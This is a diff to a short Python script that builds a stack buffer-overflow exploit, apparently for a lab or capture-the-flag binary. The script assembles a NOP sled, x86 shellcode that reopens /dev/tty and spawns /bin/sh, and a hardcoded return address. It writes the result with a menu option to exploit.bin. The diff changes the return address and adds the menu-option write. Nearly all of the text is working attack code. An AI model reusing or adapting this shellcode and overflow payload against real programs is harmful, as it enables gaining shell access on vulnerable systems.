@@ -9,7 +9,8 @@ offset = b"A"* 76
 shellcode = b"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" # 55 len
 nopadd = b"\x90"*17
 # 004011e5
-rip_add = b"\xe5\x11\x40\x00"
+# 0x000000000040114a
+rip_add = b"\x4a\x11\x40\x00"
 
 # BUFER = 72
 # SHELLCODE = 55
@@ -21,6 +22,8 @@ rip_add = b"\xe5\x11\x40\x00"
 exploit = nopadd + shellcode + rip_add
 
 f = open("exploit.bin", "wb")
+f.write(menu_option)
 f.write(exploit)
 f.close()
+print(menu_option)
 print(exploit)
